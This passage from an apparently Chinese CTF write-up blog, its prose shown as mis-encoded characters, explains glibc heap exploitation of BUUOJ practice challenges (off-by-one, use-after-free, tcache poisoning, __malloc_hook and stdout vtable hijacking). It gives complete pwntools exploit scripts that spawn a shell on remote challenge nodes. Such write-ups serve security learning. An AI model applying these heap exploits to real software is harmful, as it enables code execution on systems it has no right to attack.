class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\xe1&#x27;</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">&quot;libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p>
<blockquote>
<p>ä¸å¾—ä¸è¯´V&amp;Nå‡ºçš„é¢˜è´¨é‡è¿˜æ˜¯å¯ä»¥çš„ï¼Œè™½ç„¶è¯´å¯èƒ½å¯¹å¤§ä½¬ä»¬æ¥è¯´åªæ˜¯ä¸€é“ç®€å•é¢˜ï¼Œä½†è¿™ç¡®å®è®©æˆ‘è¿™ä¸ªå¤§ä¸€çš„èŒæ–°å—ç›ŠåŒªæµ…XD</p>
</blockquote>
<h2 id="V-amp-N2020-å…¬å¼€èµ›-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><a href="#V-amp-N2020-å…¬å¼€èµ›-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget"></a>[V&amp;N2020 å…¬å¼€èµ›]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</h2><blockquote>
<p>ä¸æ„§æ˜¯VNçš„é¢˜â€¦åˆè®©ç¬”è€…è¿™ä¸ªè’Ÿè’»pwnerå­¦åˆ°äº†ä¸€ç§æ–°çš„æ”»å‡»æ‰‹æ³•â€¦</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€ï¼Œä¸å‡ºæ„å¤–åˆæ˜¯ä¸€é“å †é¢˜<del>çœ‹åå­—ä¹ŸçŸ¥é“æ˜¯ä¸€é“å †é¢˜</del></p>
<p><img src="https://i.loli.net/2021/01/25/3ApsgBYDW1kPvZq.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/01/25/VvSMXr1gkjswG8F.png"></p>
<p>ç¨‹åºæœ¬èº«æœ‰ç€<strong>åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°ã€é‡Šæ”¾</strong>å †å—çš„åŠŸèƒ½ï¼Œç®—æ˜¯åŠŸèƒ½æ¯”è¾ƒé½å…¨</p>
<p>ä½†æ˜¯ç¨‹åºæœ¬èº«é™åˆ¶äº†<strong>åªèƒ½åˆ†é…7æ¬¡å †å—ï¼Œåªèƒ½é‡Šæ”¾3æ¬¡å †å—</strong></p>
<p><img src="https://i.loli.net/2021/01/25/bh3nFx1AWiQLIpy.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºfreeåŠŸèƒ½ä¸­<strong>æ²¡æœ‰å°†å †å—æŒ‡é’ˆç½®NULLï¼Œå­˜åœ¨Use After Freeæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/01/25/qnHTGlJfv78uzCU.png"></p>
<p>è™½ç„¶è¯´åœ¨åˆ†é…å †å—çš„åŠŸèƒ½ä¸­å¹¶æ²¡æœ‰è¿‡äºé™åˆ¶å¤§å°ï¼ˆ0x100ï¼‰ï¼Œä½†æ˜¯é¢˜ç›®æ‰€ç»™çš„libcæ˜¯æœ‰ç€tcacheçš„2.27ç‰ˆæœ¬ï¼Œéœ€è¦é€šè¿‡unsorted binæ³„éœ²main_arenaçš„åœ°å€æˆ‘ä»¬è‡³å°‘éœ€è¦é‡Šæ”¾8æ¬¡å †å—æ‰èƒ½è·å¾—ä¸€ä¸ªunsorted chunkï¼Œè€Œæˆ‘ä»¬ä»…è¢«å…è®¸é‡Šæ”¾3æ¬¡å †å—</p>
<p>ä½†æ˜¯åˆ©ç”¨use after freeæˆ‘ä»¬æ˜¯å¯ä»¥æ³„éœ²å †åŸºå€çš„ï¼Œè€Œ<strong>ç”¨ä»¥ç®¡ç†tcacheçš„tcache_perthread_structç»“æ„ä½“æœ¬èº«ä¾¿æ˜¯ç”±ä¸€ä¸ªchunkå®ç°çš„</strong></p>
<blockquote>
<p>ä»¥ä¸‹ä»£ç æ¥è‡ªglibc2.27</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">mstate ar_ptr;</span><br><span class="line"><span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">   victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºtcacheç»“æ„æœ¬èº«ä¾¿æ˜¯é€šè¿‡ä¸€ä¸ªchunkæ¥å®ç°çš„</p>
</blockquote>
<p>libc2.27ä¸­æ²¡æœ‰å¯¹tcache double freeçš„æ£€æŸ¥ï¼Œæ•…åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡tcache double freeç»“åˆuse after freeæ³„æ¼å‡ºå †åŸºå€åä¼ªé€ ä¸€ä¸ªä½äºtcache_perthread_structç»“æ„ä½“é™„è¿‘çš„fake chunkä»¥åŠ«æŒtcache_perthread_structç»“æ„ä½“ä¿®æ”¹tcache_perthread_struct-&gt;countsä¸­å¯¹åº”indexçš„å€¼ä¸º7åé‡Šæ”¾chunkä¾¿å¯ä»¥è·å¾—unsorted binä»¥æ³„éœ²libcåŸºå€</strong></p>
<p>æƒ¯ä¾‹çš„pwndbgåŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°tcacheç»“æ„ä½“çš„sizeï¼Œä¹Ÿå°±å¾—åˆ°äº†åç§»</p>
<p><img src="https://i.loli.net/2021/01/25/ceBImgTw97HbUxh.png"></p>
<blockquote>
<p>libc2.31ä¸‹è¿™ä¸ªsizeä¸º0x291ï¼Œä¸è¦åƒæˆ‘ä¸€æ ·çŠ¯äº†è°ƒé”™libcçš„é”™è¯¯âŒ</p>
</blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨freeåŠŸèƒ½ä¸­ä¼šå°†å…¶ä¿å­˜çš„chunk sizeç½®0ï¼Œ å› è€Œæˆ‘ä»¬éœ€è¦<strong>é‡æ–°å°†è¿™ä¸ªchunkç”³è¯·å›æ¥åæ‰èƒ½ç»§ç»­ç¼–è¾‘</strong></p>
<blockquote>
<p>èœé¸¡a3ã®è¸©å‘ç‚¹ * 1</p>
</blockquote>
<h3 id="è§£æ³•ä¸€ï¼šåŠ«æŒ-malloc-hook"><a href="#è§£æ³•ä¸€ï¼šåŠ«æŒ-malloc-hook" class="headerlink" title="è§£æ³•ä¸€ï¼šåŠ«æŒ__malloc_hook"></a>è§£æ³•ä¸€ï¼šåŠ«æŒ__malloc_hook</h3><p>æ¯”è¾ƒè€ç”Ÿå¸¸è°ˆçš„åšæ³•äº†ï¼Œ<strong>å› ä¸ºæˆ‘ä»¬å·²ç»è·å¾—äº†å¯¹tcacheç»“æ„ä½“çš„æ§åˆ¶æƒæ‰€ä»¥å¯ä»¥ç›´æ¥ä¿®æ”¹æŒ‡é’ˆä¸º__malloc_hookåæ”¹ä¸ºone_gadgetååˆ†é…ä»»ä¸€chunkå³å¯get shell</strong>ï¼Œè¿™ç§åšæ³•åˆšå¥½ç”¨æ»¡7æ¬¡åˆ†é…</p>
<p>ç”±äºone_gadgetå¯¹æ ˆä¸Šå€¼æœ‰è¦æ±‚ï¼Œæ•…åœ¨è¿™é‡Œé€‰æ‹©æ„é€ fake chunkåˆ°__realloc_hookæ—ï¼Œé€šè¿‡reallocä¸­çš„gadgetè°ƒæ•´æ ˆå¸§åå†è·³è½¬åˆ°one_gadget</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28658)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x260</span></span><br><span class="line">    log.info(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx4, our fake chunk</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x07&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x07&quot;</span>)) <span class="comment"># all full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x10&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) * <span class="number">21</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line">    edit(<span class="number">5</span>, p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    new(<span class="number">0x100</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/25/qg1viECIkjpyoOw.png"></p>
<blockquote>
<p>p64(0) * 21çš„åç§»ä¹Ÿæ˜¯æˆ‘æ‰‹åŠ¨è°ƒå‡ºæ¥çš„â€¦å½“ç„¶é‚£äº›ç†Ÿè¯»libcæºç çš„å¤§ä½¬åŸºæœ¬éƒ½èƒ½ç›´æ¥ğŸ§ ç®—ï¼ˆ</p>
<p><img src="https://i.loli.net/2021/01/25/ZNfxWqLCTlsMcoi.png"></p>
</blockquote>
<h3 id="è§£æ³•äºŒï¼šæ”»å‡»stdoutåŠ«æŒvtableè¡¨"><a href="#è§£æ³•äºŒï¼šæ”»å‡»stdoutåŠ«æŒvtableè¡¨" class="headerlink" title="è§£æ³•äºŒï¼šæ”»å‡»stdoutåŠ«æŒvtableè¡¨"></a>è§£æ³•äºŒï¼šæ”»å‡»stdoutåŠ«æŒvtableè¡¨</h3><blockquote>
<p>åœ¨ha1vkå¸ˆå‚…çš„åšå®¢çœ‹åˆ°çš„è§£æ³•â€¦è¿™ä¸ªæ€è·¯æˆ‘ä¸ªäººè§‰å¾—å¾ˆå·§å¦™â€¦åæ­£æ˜¯å­¦åˆ°äº†æ–°ä¸œè¥¿â€¦</p>
</blockquote>
<p>é™¤äº†åŠ«æŒ__malloc_hookä¸ºone_gadgetä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åŠ«æŒ_IO_2_1_stdout_ä¸­çš„vtableè¡¨çš„æ–¹å¼è°ƒç”¨one_gadget</p>
<p>è§‚å¯Ÿåˆ°ç¨‹åºä¸­åœ¨æˆ‘ä»¬editä¹‹åä¼šè°ƒç”¨puts()å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/01/28/NlbrxUYMTpaohFj.png"></p>
<p>puts()å‡½æ•°å®šä¹‰äºlibio&#x2F;ioputs.cä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">weak_alias (_IO_puts, <span class="built_in">puts</span>)</span><br><span class="line">libc_hidden_def (_IO_puts)</span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿåˆ°å…¶ä¼šä½¿ç”¨å®<code>_IO_sputn</code>ï¼Œè¯¥å®å®šä¹‰äºlibio&#x2F;libioP.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>å¥—å¨ƒå®ï¼Œè·Ÿè¿›ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_OFFSET 0</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br></pre></td></tr></table></figure>

<p>å³<strong>putså‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨vtableè¡¨ä¸­çš„</strong><code>__xsputn</code><strong>å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œgdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥çŸ¥é“å…¶ç›¸å¯¹è¡¨å¤´åç§»åº”å½“ä¸º<code>0x30</code>ï¼ˆ64ä½ä¸‹ï¼‰</p>
<p><img src="https://i.loli.net/2021/01/28/nDQR7vLuyY92sK6.png"></p>
<p>ç”±äº<strong>è‡ªlibc2.24å§‹å¢åŠ äº†å¯¹vtableè¡¨çš„åˆæ³•æ€§æ£€æµ‹ï¼Œæ•…æˆ‘ä»¬åªèƒ½æ‰§è¡Œä½äºåˆæ³•vtableè¡¨èŒƒå›´å†…çš„å‡½æ•°æŒ‡é’ˆ</strong></p>
<p>è€ƒè™‘åˆ°<strong>_IO_str_finishå‡½æ•°ä¼šå°†FILEæŒ‡é’ˆ + 0xE8çš„ä½ç½®ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</strong>ï¼Œæ•…æˆ‘ä»¬é€‰æ‹©ä¿®æ”¹_IO_2_1_stdout_çš„vtableè¡¨è‡³ç‰¹å®šä½ç½®ä»¥<strong>è°ƒç”¨_IO_str_finishå‡½æ•°</strong></p>
